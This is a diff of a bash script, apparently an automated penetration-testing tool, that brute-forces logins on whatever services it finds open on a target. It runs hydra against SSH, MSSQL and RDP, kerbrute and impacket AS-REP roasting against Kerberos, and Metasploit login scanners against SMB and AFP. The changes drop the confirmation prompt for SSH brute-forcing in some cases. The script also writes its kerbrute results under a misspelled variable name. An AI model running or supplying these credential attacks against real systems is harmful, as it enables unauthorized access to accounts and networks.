@@ -138,16 +138,21 @@ rdp_svc=$(echo "$scan_res" | grep "3389/tcp open")
 #SSH
 
 if [[ ! -z "$ssh_svc" ]];then
-echo "===> SSH Open : Enum With hydra ssh ? (yes/no)"
-#echo "===> SSH Open : Enum With MSF MODULE SSH_Login"
+echo "===> SSH Open : BF With hydra ssh"
 echo "$(echo "$users" | wc -l ) Users"
+if [ "$nbusers" -lt 80 ]; then 
+echo "===> SSH Open : Few Users , Let's go"
+bash create_user_password_list.sh > userpass
+hydra -C userpass -I -t 4 -V $line ssh
+else
+echo "===> SSH Open : Lot of users, are you sure (yes/no)"
 read -t 5 sshbrute
 if [ "$sshbrute" == "yes" ];then
-#msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set THREADS 10; exploit; exit;"
 bash create_user_password_list.sh > userpass
-hydra -C userpass -t 4 -V $line ssh
+hydra -C userpass -I -t 4 -V $line ssh
 else
 echo "===> SSH Bruteforce Aborted"
+fi
 fi
 else 
 echo "===> SSH Closed"
@@ -173,14 +178,16 @@ echo "===> Kerberos Open : Impacket GetNPUsers "
 impacket-GetNPUsers -dc-ip $line $url/ -usersfile users
 echo "===> Kerberos Open : Kerbrute "
 bash create_user_password_list.sh > userpass
-cat userpass | /root/go/bin/kerbrute -d $url bruteforce -
+validuserpasskerbrute=$(/root/go/bin/kerbrute -d $url bruteforce userpass | grep "VALID LOGIN" | cut -d " " -f 8)
+echo "$validuserpasskerbrute"
+echo "$valid_user_pass_kerbrute" > valid_user_pass_kerbrute
 else 
 echo "===> Kerberos Closed"
 fi
 
 
 if [[ ! -z "$smb_svc" ]];then
-echo "===> SMB Open : Enum With MSF MODULE SMB_Login (CTRL+C to skip)"
+echo "===> SMB Open : BF With MSF MODULE SMB_Login (CTRL+C to skip)"
 msfconsole -q -x "use auxiliary/scanner/smb/smb_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set SMBDOMAIN $url; set THREADS 10; exploit; exit;"
 else 
 echo "===> SMB Closed"
@@ -188,7 +195,7 @@ fi
 
 
 if [[ ! -z "$afp_svc" ]];then
-echo "===> AFP Open : Enum With MSF MODULE AFP_Login"
+echo "===> AFP Open : BF With MSF MODULE AFP_Login"
 msfconsole -q -x "use auxiliary/scanner/afp/afp_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1;set THREADS 10; exploit; exit;"
 else 
 echo "===> AFP Closed"
@@ -196,7 +203,7 @@ fi
 
 
 if [[ ! -z "$mssql_svc" ]];then
-echo "===> MSSQL Open : Enum With Hydra MSSQL"
+echo "===> MSSQL Open : BF With Hydra MSSQL"
 bash create_user_password_list.sh > userpass
 hydra -C userpass $line mssql
 else 
@@ -205,7 +212,7 @@ fi
 
 
 if [[ ! -z "$rdp_svc" ]];then
-echo "===> RDP Open : Enum With Hydra RDP"
+echo "===> RDP Open : BF With Hydra RDP"
 bash create_user_password_list.sh > userpass
 hydra -t 1 -V -f -C userpass rdp://$line
 else 
